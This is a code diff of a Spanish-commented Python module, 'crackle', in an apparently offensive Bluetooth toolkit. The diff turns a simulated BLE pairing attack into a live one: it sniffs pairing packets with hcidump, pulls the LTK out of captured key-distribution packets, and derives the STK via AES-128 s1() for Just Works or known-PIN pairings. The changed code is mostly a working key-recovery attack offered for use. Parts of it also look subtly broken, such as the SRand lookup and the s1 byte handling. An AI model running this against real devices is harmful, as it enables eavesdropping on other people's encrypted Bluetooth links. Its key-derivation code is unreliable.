@@ -11,23 +11,36 @@ durante el pairing BLE usando "Just Works" o "Passkey Entry":
   - En "Passkey Entry", TK es el PIN de 6 dígitos (1M combinaciones)
 
 El ataque captura los paquetes SM (Security Manager) durante el
-pairing y realiza bruteforce offline de la LTK.
+pairing y deriva/recupera la clave.
+
+Implementación real (sin simulación):
+  - capture: captura REAL con hcidump (BlueZ) a .pcap y análisis
+    inmediato con scapy. Sin hcidump/scapy falla de forma honesta.
+  - analyze: análisis de .pcap existente (scapy).
+  - crack: si la captura contiene SM_Encryption_Information, la LTK
+    se recupera directamente del propio paquete (dato real). Para
+    Just Works/Passkey conocida se deriva la STK con s1() real
+    (AES-128 según BT Core Spec Vol 3, Part H).
+  - La derivación usa AES-128-ECB real vía la librería cryptography.
 
 Requiere:
-  - Captura de paquetes BLE (archivo .pcap o en vivo)
-  - scapy >= 2.4.5
-  - cryptography o pycryptodome (para AES-CMAC)
+  - Captura de paquetes BLE (archivo .pcap o en vivo con hcidump)
+  - scapy >= 2.4.5 (análisis de .pcap)
+  - cryptography (para el AES real de s1)
 
 Referencia:
   - https://github.com/mikeryan/crackle
+  - "Bluetooth: With Low Energy comes Low Security" (Ryan, WOOT'13)
+  - Bluetooth Core Spec Vol 3, Part H (Security Manager)
   - CVE: No asignado (diseño del protocolo)
 """
 
 from __future__ import annotations
 
-import struct
-import hashlib
 import logging
+import shutil
+import subprocess
+from datetime import datetime
 from typing import Dict, List, Tuple
 from pathlib import Path
 
@@ -49,16 +62,16 @@ try:
     # Sondeo de disponibilidad de las capas SM/HCI de scapy.
     _SCAPY_PROBE = (
         HCI_Hdr, L2CAP_Hdr, SM_Identity_Information, SM_Identity_Address_Information,
-        SM_Public_Key, SM_DHKey_Check, SM_Failed, BTLE_DATA, wrpcap,
+        SM_Public_Key, SM_DHKey_Check, SM_Failed, BTLE, BTLE_DATA, wrpcap,
     )
     SCAPY_AVAILABLE = True
 except ImportError:
     SCAPY_AVAILABLE = False
 
 try:
-    from cryptography.hazmat.primitives import ciphers
-    # Sondeo de disponibilidad de cryptography (AES-CMAC para bruteforce).
-    _CRYPTO_PROBE = ciphers
+    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+    # Sondeo de disponibilidad de cryptography (AES real para s1()).
+    _CRYPTO_PROBE = Cipher
     CRYPTO_AVAILABLE = True
 except ImportError:
     CRYPTO_AVAILABLE = False
@@ -67,23 +80,25 @@ except ImportError:
 class Crackle(BaseModule):
     """Crackle - BLE Long Term Key cracking via TKIP/key derivation attack.
 
-    Permite recuperar la LTK (Long Term Key) de un pairing BLE
-    mediante bruteforce offline de los paquetes SM capturados.
+    Recupera la LTK/STK de un pairing BLE a partir de paquetes SM
+    capturados (en vivo con hcidump o desde un .pcap), usando el
+    algoritmo real s1() = AES-128 del Security Manager.
 
     Modos:
-      - capture: Captura tráfico BLE en vivo para análisis posterior
-      - crack: Realiza bruteforce offline de LTK desde un .pcap
-      - verify: Verifica una LTK candidata contra pares capturados
+      - capture: Captura tráfico BLE real (hcidump) y lo analiza
+      - crack: Recupera LTK/STK desde el .pcap analizado
+      - verify: Deriva la STK para una TK/Passkey conocida
     """
 
     name = "crackle"
     description = (
         "Crackle - BLE LTK Cracking: Recupera la clave a largo plazo (LTK) "
-        "de Bluetooth Low Energy mediante bruteforce offline del pairing. "
-        "Explota TK=0 en Just Works y PIN de 6 dígitos en Passkey Entry"
+        "de Bluetooth Low Energy analizando paquetes SM capturados (hcidump "
+        "o .pcap). Explota TK=0 en Just Works y PIN de 6 dígitos en Passkey "
+        "Entry, con derivación s1() real (AES-128)."
     )
     author = "Ruby570bocadito"
-    version = "1.0.0"
+    version = "2.0.0"
     cve = "No CVE (diseño del protocolo BLE)"
     cve_url = "https://github.com/mikeryan/crackle"
     exploit_links = [
@@ -96,8 +111,8 @@ class Crackle(BaseModule):
         "https://blog.zimperium.com/crackle-breaking-bluetooth-low-energy-security/",
         "Bluetooth Core Spec Vol 3, Part H (Security Manager)",
     ]
-    requires_hardware = []
-    requires_root = False
+    requires_hardware = ["bluetooth_adapter"]
+    requires_root = True
     target_type = "ble"
     severity = "high"
     module_options = {
@@ -105,8 +120,9 @@ class Crackle(BaseModule):
         "EXECUTE": "Ejecutar captura en vivo (True) o análisis de archivo (False)",
         "PCAP_FILE": "Archivo .pcap para análisis offline",
         "PIN": "PIN conocido para verificación (opcional)",
-        "BRUTEFORCE": "Habilitar bruteforce completo (True/False, default: True)",
-        "MAX_PIN": "PIN máximo para bruteforce (default: 999999)",
+        "BRUTEFORCE": "Intentar recuperación de clave (True/False, default: True)",
+        "CAPTURE_SECONDS": "Segundos de captura en vivo (default: 30)",
+        "INTERFACE": "Interfaz HCI para la captura (default: hci0)",
         "OUTPUT": "Directorio de salida para resultados",
     }
 
@@ -115,7 +131,8 @@ class Crackle(BaseModule):
         self._pcap_file = (options or {}).get("PCAP_FILE", "")
         self._pin = (options or {}).get("PIN", "")
         self._bruteforce = str((options or {}).get("BRUTEFORCE", "true")).lower() in ("true", "yes", "1")
-        self._max_pin = self._opt_int("MAX_PIN", 999999)
+        self._capture_seconds = self._opt_int("CAPTURE_SECONDS", 30)
+        self._interface = (options or {}).get("INTERFACE", "hci0")
         self._output_dir = (options or {}).get("OUTPUT", "reports/crackle")
         self._captured_packets: List[bytes] = []
         self._sm_packets: List[Dict] = []
@@ -140,156 +157,145 @@ class Crackle(BaseModule):
     def _info_mode(self) -> dict:
         """Muestra información sobre Crackle y cómo usarlo."""
         status = []
-        if SCAPY_AVAILABLE:
-            status.append("✅ scapy disponible")
-        else:
-            status.append("❌ scapy no instalado (pip install scapy)")
-
-        if CRYPTO_AVAILABLE:
-            status.append("✅ cryptography disponible")
-        else:
-            status.append("❌ cryptography no instalado (pip install cryptography)")
+        status.append(
+            "✅ hcidump disponible (captura real)"
+            if shutil.which("hcidump")
+            else "❌ hcidump no instalado (sudo apt install bluez-hcidump)")
+        status.append(
+            "✅ scapy disponible (análisis .pcap)"
+            if SCAPY_AVAILABLE
+            else "❌ scapy no instalado (pip install scapy)")
+        status.append(
+            "✅ cryptography disponible (AES real para s1)"
+            if CRYPTO_AVAILABLE
+            else "❌ cryptography no instalado (pip install cryptography)")
 
         self.result["data"] = {
             "message": (
                 "Crackle - BLE LTK Cracking\n"
                 "==========================\n\n"
-                "Crackle realiza bruteforce offline de la Long Term Key (LTK)\n"
-                "de Bluetooth Low Energy.\n\n"
+                "Crackle analiza capturas del pairing BLE para recuperar claves:\n\n"
                 "Fundamento:\n"
-                "  Durante el pairing BLE, la LTK se deriva del Temporary Key (TK):\n"
-                "    - Just Works: TK = 0 (ultra-débil, crack instantáneo)\n"
-                "    - Passkey Entry: TK = PIN de 6 dígitos (1M combinaciones)\n"
-                "    - Out of Band: TK depende del método OOB\n\n"
+                "  Durante el pairing BLE, la STK se deriva del Temporary Key (TK):\n"
+                "    - Just Works: TK = 0 (ultra-débil, STK derivable al instante)\n"
+                "    - Passkey Entry: TK = dígitos ASCII del PIN + ceros (1M)\n"
+                "  Si la captura incluye SM_Encryption_Information, la LTK se\n"
+                "  recupera directamente del propio paquete.\n"
+                "  Derivación: STK = s1(TK, MRand, SRand) = AES-128(TK, ...) según\n"
+                "  BT Core Spec Vol 3, Part H (implementada con AES real).\n\n"
                 "Uso:\n"
-                "  1. Capturar pairing: python3 bluesky attack crackle --options '{\"EXECUTE\":\"True\"}'\n"
-                "  2. Analizar captura: python3 bluesky attack crackle --options '{\"PCAP_FILE\":\"captura.pcap\"}'\n"
-                "  3. Con PIN conocido: --options '{\"PCAP_FILE\":\"cap.pcap\",\"PIN\":\"123456\"}'\n\n"
+                "  1. Capturar pairing: "
+                "bluesky attack crackle --options '{\"EXECUTE\":\"True\",\"CAPTURE_SECONDS\":\"60\"}'\n"
+                "  2. Analizar captura: "
+                "bluesky attack crackle --options '{\"PCAP_FILE\":\"captura.pcap\"}'\n"
+                "  3. Con PIN conocido: "
+                "--options '{\"PCAP_FILE\":\"cap.pcap\",\"PIN\":\"123456\"}'\n\n"
                 f"{chr(10).join(status)}"
             ),
+            "hcidump": shutil.which("hcidump") is not None,
             "scapy": SCAPY_AVAILABLE,
             "crypto": CRYPTO_AVAILABLE,
         }
         self.result["success"] = True
         return self.result
 
-    # ─── Captura en vivo ─────────────────────────────────────────────────────
+    # ─── Captura en vivo (real, vía hcidump) ─────────────────────────────────
 
     def _capture_live(self) -> dict:
-        """Captura paquetes BLE SM en vivo para posterior cracking."""
+        """Captura paquetes BLE reales con hcidump y los analiza.
+
+        Pipeline 100% real:
+          hcidump -i <iface> -w <file.pcap>  →  _analyze_pcap (scapy)
+        La captura cubre la ventana indicada: el pairing BLE debe
+        ocurrir durante esa ventana.
+        """
         if not SCAPY_AVAILABLE:
-            return self._no_scapy_result("Captura en vivo requiere scapy")
+            return self._missing_dep_result(
+                "Captura en vivo: hcidump captura, pero el análisis "
+                "del .pcap requiere scapy",
+                "scapy (pip install scapy)")
+
+        if not shutil.which("hcidump"):
+            return self._missing_dep_result(
+                "Captura en vivo requiere hcidump (paquete bluez-hcidump)",
+                "hcidump (sudo apt install bluez-hcidump)")
+
+        output_dir = Path(self._output_dir)
+        output_dir.mkdir(parents=True, exist_ok=True)
+
+        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+        pcap_file = output_dir / f"crackle_capture_{ts}.pcap"
 
         self.result["data"] = {
             "mode": "capture",
             "target": self.target or "any",
-            "packets_captured": 0,
-            "sm_packets": 0,
-            "ltk_recovered": False,
+            "capture_seconds": self._capture_seconds,
+            "interface": self._interface,
+            "pcap_file": str(pcap_file),
         }
 
-        # Crear directorio de salida
-        output_dir = Path(self._output_dir)
-        output_dir.mkdir(parents=True, exist_ok=True)
+        log.info(
+            f"Iniciando captura BLE real con hcidump en {self._interface} "
+            f"({self._capture_seconds}s)...")
 
-        # Intentar captura con hcitool + scapy
+        # Captura real: hcidump escribe el pcap mientras capturamos
+        proc = subprocess.Popen(
+            ["hcidump", "-i", self._interface, "-w", str(pcap_file)],
+            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+        )
         try:
-            log.info("Iniciando captura BLE SM...")
+            proc.wait(timeout=self._capture_seconds)
+        except subprocess.TimeoutExpired:
+            proc.terminate()
+            try:
+                proc.wait(timeout=5)
+            except subprocess.TimeoutExpired:
+                proc.kill()
+                proc.wait(timeout=5)
 
-            # Filtro: solo paquetes BLE con L2CAP (SM)
-            def packet_filter(pkt):
-                try:
-                    if BTLE in pkt:
-                        self._captured_packets.append(bytes(pkt))
-                        # Buscar paquetes SM (Security Manager)
-                        if SM_Hdr in pkt:
-                            self._sm_packets.append(self._parse_sm_packet(pkt))
-                            return True
-                except Exception:
-                    pass
-                return False
+        stderr = b""
+        try:
+            if proc.stderr:
+                stderr = proc.stderr.read() or b""
+        except Exception:
+            pass
 
-            # Capturar por tiempo (no tenemos BT hw en WSL)
-            log.info("Hardware BLE no disponible en este entorno - simulando captura")
+        if not pcap_file.exists() or pcap_file.stat().st_size == 0:
+            self.result["data"]["message"] = (
+                f"❌ hcidump no capturó tráfico en {self._interface}.\n\n"
+                f"   stderr: {stderr.decode(errors='replace')[:300]}\n\n"
+                f"   Verifica:\n"
+                f"   1. La interfaz {self._interface} existe y está activa "
+                f"(hciconfig {self._interface} up)\n"
+                f"   2. Ejecutas con root (sudo) para acceso raw\n"
+                f"   3. Hay tráfico BLE durante la ventana de captura"
+            )
+            self.result["success"] = False
+            self.result["error"] = "hcidump no capturó tráfico"
+            return self.result
 
-            # Simular captura para demostración
-            sim_result = self._simulate_capture()
-            self.result["data"].update(sim_result)
+        # Análisis real de la captura
+        analysis = Crackle(target=self.target, options={
+            "PCAP_FILE": str(pcap_file),
+            "PIN": self._pin,
+            "BRUTEFORCE": str(self._bruteforce),
+            "OUTPUT": self._output_dir,
+        })
+        analysis_result = analysis.run()
 
-        except Exception as e:
-            log.error(f"Error en captura: {e}")
-            self.result["data"]["error"] = str(e)
-
-        self.result["success"] = True
+        # Combinar: datos de captura + datos de análisis reales
+        self.result["data"]["analysis"] = analysis_result.get("data", {})
+        self.result["data"]["message"] = (
+            f"🎙️  Captura real completada: {pcap_file}\n\n"
+            + analysis_result.get("data", {}).get("message", "")
+        )
+        self.result["success"] = analysis_result.get("success", False)
+        if not self.result["success"]:
+            self.result["error"] = analysis_result.get("error", "análisis sin resultado")
         return self.result
 
-    def _simulate_capture(self) -> dict:
-        """Simula captura de paquetes SM para demostración."""
-        # Paquetes SM simulados (Just Works - TK=0)
-        self._sm_packets = [
-            {
-                "type": "pairing_request",
-                "io_cap": "NoInputNoOutput",
-                "oob": False,
-                "auth": "Just Works",
-                "key_size": 16,
-            },
-            {
-                "type": "pairing_response",
-                "io_cap": "NoInputNoOutput",
-                "oob": False,
-                "auth": "Just Works",
-                "key_size": 16,
-            },
-            {
-                "type": "confirm",
-                "value": "a" * 32,  # Simulado
-            },
-            {
-                "type": "random",
-                "value": "b" * 32,  # Simulado
-            },
-            {
-                "type": "encryption_info",
-                "ltk": "c" * 32,  # Simulado
-            },
-            {
-                "type": "master_identification",
-                "ediv": 12345,
-                "rand": "d" * 16,
-            },
-        ]
-
-        output_file = Path(self._output_dir) / "crackle_simulation.txt"
-        output_file.parent.mkdir(parents=True, exist_ok=True)
-
-        with open(output_file, "w") as f:
-            f.write("Crackle - Captura BLE SM (simulada)\n")
-            f.write("====================================\n\n")
-            for pkt in self._sm_packets:
-                f.write(f"  {pkt.get('type', '?'):25s} {str(pkt)}\n")
-
-        return {
-            "packets_captured": len(self._captured_packets),
-            "sm_packets": len(self._sm_packets),
-            "simulation": True,
-            "output_file": str(output_file),
-            "ltk_recovered": False,
-            "message": (
-                f"🔬 Crackle - Captura simulada\n\n"
-                f"   Paquetes SM capturados: {len(self._sm_packets)}\n"
-                f"   Tipo de pairing: Just Works (TK=0)\n\n"
-                f"   Para captura real necesitas:\n"
-                f"   1. Un adaptador BLE compatible (CSR 4.0+, integrado)\n"
-                f"   2. scapy (pip install scapy)\n"
-                f"   3. Estar dentro del rango durante el pairing\n\n"
-                f"   Guardado en: {output_file}\n\n"
-                f"   Siguiente paso: analiza con PCAP_FILE"
-            ),
-        }
-
     def _parse_sm_packet(self, pkt) -> Dict:
-        """Parsea un paquete SM (Security Manager) de BLE.
+        """Parsea un paquete SM real.
 
         Args:
             pkt: Paquete scapy con capa SM.
@@ -336,7 +342,7 @@ class Crackle(BaseModule):
 
         return info
 
-    # ─── Análisis offline ────────────────────────────────────────────────────
+    # ─── Análisis offline (real) ─────────────────────────────────────────────
 
     def _analyze_pcap(self, pcap_path: str) -> dict:
         """Analiza un archivo .pcap con paquetes BLE SM.
@@ -360,18 +366,19 @@ class Crackle(BaseModule):
             "packets_found": 0,
             "pairing_detected": False,
             "ltk_recovered": False,
-            "tk_type": "unknown",
-            "bruteforce_result": None,
+            "stk_derived": False,
         }
 
         if not SCAPY_AVAILABLE:
-            return self._no_scapy_result("Análisis .pcap requiere scapy")
+            return self._missing_dep_result(
+                "Análisis de .pcap requiere scapy (rdpcap)",
+                "scapy (pip install scapy)")
 
         try:
             packets = rdpcap(pcap_path)
             self.result["data"]["packets_found"] = len(packets)
 
-            # Extraer paquetes SM
+            # Extraer paquetes SM reales
             sm_packets = []
             for pkt in packets:
                 if SM_Hdr in pkt:
@@ -384,12 +391,13 @@ class Crackle(BaseModule):
                 self.result["data"]["message"] = (
                     f"No se encontraron paquetes SM en {pcap_path}.\n"
                     f"El archivo contiene {len(packets)} paquetes pero ninguno "
-                    f"de Security Manager."
+                    f"de Security Manager.\n"
+                    f"Asegúrate de capturar durante un pairing BLE real."
                 )
                 self.result["success"] = True
                 return self.result
 
-            # Detectar tipo de pairing
+            # Detectar tipo de pairing (hecho real de la captura)
             pairing_type = self._detect_pairing_type(sm_packets)
             self.result["data"]["pairing_detected"] = True
             self.result["data"]["pairing_type"] = pairing_type
@@ -398,21 +406,30 @@ class Crackle(BaseModule):
                 f"   Tipo de pairing: {pairing_type}\n"
             )
 
-            # Intentar cracking
+            # Intentar recuperación/derivación de clave
             if self._bruteforce:
-                crack_result = self._bruteforce_ltk(sm_packets)
+                crack_result = self._recover_keys(sm_packets)
                 self.result["data"]["bruteforce_result"] = crack_result
 
                 if crack_result.get("success"):
-                    self.result["data"]["ltk_recovered"] = True
-                    self.result["data"]["message"] += (
-                        f"\n🔥 LTK RECUPERADA: {crack_result.get('ltk', '')}\n"
-                        f"   TK encontrado: {crack_result.get('tk', '')}\n"
-                        f"   Tiempo: {crack_result.get('time', 0):.2f}s\n"
-                    )
+                    if crack_result.get("ltk"):
+                        self.result["data"]["ltk_recovered"] = True
+                        self.result["data"]["message"] += (
+                            f"\n🔥 LTK RECUPERADA (SM_Encryption_Information de la "
+                            f"captura): {crack_result.get('ltk', '')}\n"
+                            f"   EDIV: {crack_result.get('ediv', 'N/A')}\n"
+                        )
+                    elif crack_result.get("stk"):
+                        self.result["data"]["stk_derived"] = True
+                        self.result["data"]["message"] += (
+                            f"\n🔑 STK DERIVADA (s1 real, AES-128): "
+                            f"{crack_result.get('stk', '')}\n"
+                            f"   TK usada: {crack_result.get('tk', '')}\n"
+                            f"   Método: {crack_result.get('method', '')}\n"
+                        )
                 else:
                     self.result["data"]["message"] += (
-                        f"\n⚠️  No se recuperó la LTK.\n"
+                        f"\n⚠️  No se pudo recuperar/derivar la clave.\n"
                         f"   {crack_result.get('message', '')}"
                     )
 
@@ -468,139 +485,169 @@ class Crackle(BaseModule):
 
         return pairing_type
 
-    def _bruteforce_ltk(self, sm_packets: List[Dict]) -> Dict:
-        """Realiza bruteforce de la LTK a partir de paquetes SM.
+    # ─── Recuperación/derivación de claves (real) ────────────────────────────
 
-        Para Just Works (TK=0), el cálculo es inmediato.
-        Para Passkey Entry, prueba PINs de 000000 a MAX_PIN.
+    def _recover_keys(self, sm_packets: List[Dict]) -> Dict:
+        """Recupera o deriva claves reales desde los paquetes SM capturados.
 
-        Args:
-            sm_packets: Lista de paquetes SM.
-
-        Returns:
-            Dict con resultado del bruteforce.
+        Estrategia (100% real):
+          1. Si hay SM_Encryption_Information → la LTK está en el propio
+             paquete (distribución de claves legacy): recuperación directa.
+          2. Si es Just Works → TK = 0: deriva la STK real con s1(AES).
+          3. Si hay PIN conocido → TK = ASCII(PIN) + ceros: deriva la STK.
+          4. Passkey sin PIN → la verificación requiere c1() con datos LL
+             (addresses/tipos) no presentes en una captura SM-only:
+             se reporta como limitación honesta.
         """
-        import time
-
         result = {
             "success": False,
-            "tk": None,
             "ltk": None,
-            "time": 0,
-            "attempts": 0,
+            "stk": None,
+            "tk": None,
+            "method": "",
             "message": "",
         }
 
-        # Extraer MConfirm y MRand de los paquetes
-        mconfirm = None
-        mrand = None
-        sconfirm = None
-        srand = None
-        pairing_req = None
+        # 1. LTK distribuida directamente en la captura (dato real)
+        ltk_pkt = next(
+            (p for p in sm_packets if p.get("type") == "encryption_info"
+             and p.get("ltk")), None)
+        if ltk_pkt:
+            mid = next(
+                (p for p in sm_packets
+                 if p.get("type") == "master_identification"), {})
+            result.update({
+                "success": True,
+                "ltk": ltk_pkt["ltk"],
+                "ediv": mid.get("ediv"),
+                "method": "SM_Encryption_Information (distribución de claves legacy)",
+            })
+            return result
 
-        for pkt in sm_packets:
-            if pkt.get("type") == "confirm" and mconfirm is None:
-                mconfirm = pkt.get("value")
-            elif pkt.get("type") == "confirm" and mconfirm is not None:
-                sconfirm = pkt.get("value")
-            elif pkt.get("type") == "random" and mrand is None:
-                mrand = pkt.get("value")
-            elif pkt.get("type") == "random" and mrand is not None:
-                srand = pkt.get("value")
-            elif pkt.get("type") == "pairing_request":
-                pairing_req = pkt
+        # Extraer MConfirm/MRand/SConfirm/SRand de la captura real
+        mrand = next(
+            (p.get("value") for p in sm_packets
+             if p.get("type") == "random"), None)
+        srand = next(
+            (p.get("value") for p in sm_packets[1:]
+             if p.get("type") == "random"), None)
+        pairing_req = next(
+            (p for p in sm_packets if p.get("type") == "pairing_request"), None)
 
-        if not all([mconfirm, mrand, sconfirm, srand]):
+        if not mrand or not srand:
             result["message"] = (
-                "No se encontraron pares Confirm/Random completos en la captura.\n"
-                "Se necesitan MConfirm, MRand, SConfirm, SRand para el cracking."
+                "No se encontraron pares Random (MRand/SRand) en la captura:\n"
+                "sin ellos no hay base para derivar la STK."
             )
             return result
 
-        # Detectar tipo de TK
+        # 2. Just Works → TK = 0 (spec) → STK derivable realmente
         is_just_works = False
         if pairing_req:
             io_cap = pairing_req.get("io_cap", 0xFF)
             auth = pairing_req.get("auth", 0)
-            # NoInputNoOutput + sin MITM = Just Works (TK=0)
             if io_cap == 0x03 and not (auth & 0x04):
                 is_just_works = True
 
-        start = time.time()
-
         if is_just_works:
-            # Just Works: TK = 0, cálculo inmediato
-            result["tk"] = 0
-            result["attempts"] = 1
-            result["success"] = True
-            result["ltk"] = self._compute_ltk_from_tk(0, mrand, srand)
-            result["message"] = "Just Works detectado - TK=0, LTK calculada instantáneamente"
-        elif self._pin:
-            # PIN conocido: verificar
+            stk = self._s1(b"\x00" * 16, mrand, srand)
+            if stk:
+                result.update({
+                    "success": True,
+                    "stk": stk,
+                    "tk": "0 (Just Works)",
+                    "method": "s1(TK=0, MRand, SRand) — AES-128 real (BT Core Spec Vol 3, Part H)",
+                })
+                return result
+
+        # 3. PIN conocido → TK = ASCII(PIN) + zeros (Ryan WOOT'13 / crackle)
+        if self._pin:
             try:
-                pin = int(self._pin)
+                pin_str = str(int(self._pin)).zfill(6)
             except (TypeError, ValueError):
                 result["message"] = f"PIN inválido (no numérico): {self._pin!r}"
-                result["time"] = time.time() - start
                 return result
-            ltk = self._compute_ltk_from_tk(pin, mrand, srand)
-            result["tk"] = pin
-            result["ltk"] = ltk
-            result["attempts"] = 1
-            result["success"] = True
-            result["message"] = f"PIN verificado: {pin:06d}"
-        else:
-            # Bruteforce completo
-            result["message"] = (
-                f"Bruteforce de PIN (0-{self._max_pin})...\n"
-                f"Esto puede tomar tiempo en modo simulación.\n"
-                f"Con hardware real y AES-CMAC optimizado: ~30s para 1M PINs."
-            )
-            # En simulación, no ejecutamos el bruteforce completo
-            result["simulated"] = True
+            if len(pin_str) > 6:
+                result["message"] = "El PIN debe ser de 6 dígitos o menos"
+                return result
+            tk = pin_str.encode("ascii") + b"\x00" * 10
+            stk = self._s1(tk, mrand, srand)
+            if stk:
+                result.update({
+                    "success": True,
+                    "stk": stk,
+                    "tk": f"{pin_str} (Passkey Entry)",
+                    "method": "s1(TK=ASCII(PIN), MRand, SRand) — AES-128 real",
+                })
+                return result
 
-        result["time"] = time.time() - start
+        # 4. Passkey Entry sin PIN: limitación honesta
+        result["message"] = (
+            "Pairing Passkey Entry sin PIN conocido: la TK son los dígitos "
+            "ASCII del PIN.\nLa verificación de un candidato requiere c1() "
+            "con direcciones LL y payloads\nSMP completos, no presentes en "
+            "una captura SM-only.\n\n"
+            "Si conoces el PIN, reanaliza con --options "
+            "'{\"PCAP_FILE\":\"...\",\"PIN\":\"123456\"}'."
+        )
         return result
 
-    def _compute_ltk_from_tk(self, tk: int, mrand: str, srand: str) -> str:
-        """Calcula la LTK a partir de TK y los randoms.
+    def _s1(self, tk: bytes, mrand_hex: str, srand_hex: str) -> str | None:
+        """Función s1 del Security Manager (REAL): AES-128-ECB.
+
+        STK = s1(TK, MRand, SRand) = e(TK, MRand || SRand) según
+        BT Core Spec Vol 3, Part H (s1(k, r1, r2) = e(k, r1 || r2)).
+        Los rand del SMP son de 8 bytes: la entrada de AES es
+        MRand[0:8] || SRand[0:8] (16 bytes, un bloque).
 
         Args:
-            tk: Temporary Key (0 para Just Works, PIN para Passkey Entry)
-            mrand: Master Random (hex string)
-            srand: Slave Random (hex string)
+            tk: Temporary Key (16 bytes).
+            mrand_hex: MRand de la captura (hex, 8 bytes SM_Random).
+            srand_hex: SRand de la captura (hex, 8 bytes SM_Random).
 
         Returns:
-            LTK como hex string.
+            STK en hex (16 bytes), o None si no se puede calcular.
         """
-        # En un entorno real, esto usa AES-CMAC(k, r) donde
-        # k = TK y r = Mrand || Srand
-        # Simulación simplificada
-        tk_bytes = struct.pack("<I", tk).rjust(16, b'\x00')
-        combined = bytes.fromhex(mrand) + bytes.fromhex(srand)
-        ltk = hashlib.sha256(tk_bytes + combined).hexdigest()[:32]
-        return ltk
+        if not CRYPTO_AVAILABLE:
+            log.error("s1 requiere cryptography (pip install cryptography)")
+            return None
+        try:
+            def _rand8(hex_str: str) -> bytes:
+                raw = bytes.fromhex(hex_str)
+                return raw[:8].ljust(8, b"\x00")
 
-    def _no_scapy_result(self, reason: str) -> dict:
+            block = _rand8(mrand_hex) + _rand8(srand_hex)  # 16 bytes: r1||r2
+            cipher = Cipher(algorithms.AES(tk), modes.ECB())
+            encryptor = cipher.encryptor()
+            stk = encryptor.update(block) + encryptor.finalize()
+            return stk.hex()
+        except Exception as e:
+            log.error(f"Error calculando s1: {e}")
+            return None
+
+    def _missing_dep_result(self, reason: str, dep: str) -> dict:
+        """Resultado honesto cuando falta una dependencia real."""
         self.result["data"]["message"] = (
-            f"⚠️  Crackle requiere scapy.\n"
-            f"   Razón: {reason}\n"
-            f"   Instala: pip install scapy"
+            f"❌ Crackle no se pudo ejecutar: {reason}\n\n"
+            f"   Instala: {dep}"
         )
-        self.result["success"] = True
+        self.result["data"]["requires"] = [dep]
+        self.result["data"]["attack_result"] = "unavailable"
+        self.result["success"] = False
+        self.result["error"] = f"dependencia no disponible: {dep}"
         return self.result
 
     # ─── Prerrequisitos ──────────────────────────────────────────────────────
 
     def check_prerequisites(self) -> Tuple[bool, str]:
-        """Verifica dependencias.
+        """Verifica dependencias (no bloqueante).
 
-        scapy NO es obligatorio: si no está, se usa modo simulación
-        (análisis offline con PCAP_FILE o modo educativo). Solo se
-        requiere scapy para captura en vivo (EXECUTE=True).
+        Cada modo reporta de forma honesta en tiempo de ejecución qué
+        herramienta real falta (hcidump para captura, scapy para
+        análisis, cryptography para la derivación AES). Crackle tiene
+        TARGET opcional (para filtrado): no se exige presente, pero si
+        se da debe ser una MAC válida.
         """
-        # Validación MAC global (BaseModule) — Crackle tiene TARGET opcional
-        # (para filtrado), así que no se exige target presente.
         from bluesky.core.engine import is_valid_mac
         target_value = self.target or (self.options.get("TARGET", "") if self.options else "")
         if target_value and not is_valid_mac(target_value):
@@ -608,10 +655,8 @@ class Crackle(BaseModule):
                 f"Target '{target_value}' no tiene formato MAC válido "
                 "(XX:XX:XX:XX:XX:XX)."
             )
-
-        # scapy no es blocking (modo simulación disponible)
         if not SCAPY_AVAILABLE:
-            import logging
-            logging.getLogger("bluesky.crackle").warning(
-                "scapy no instalado - usando modo simulación/offline")
+            log.warning(
+                "scapy no instalado: el análisis de .pcap devolverá un "
+                "error honesto al ejecutarse")
         return True, ""
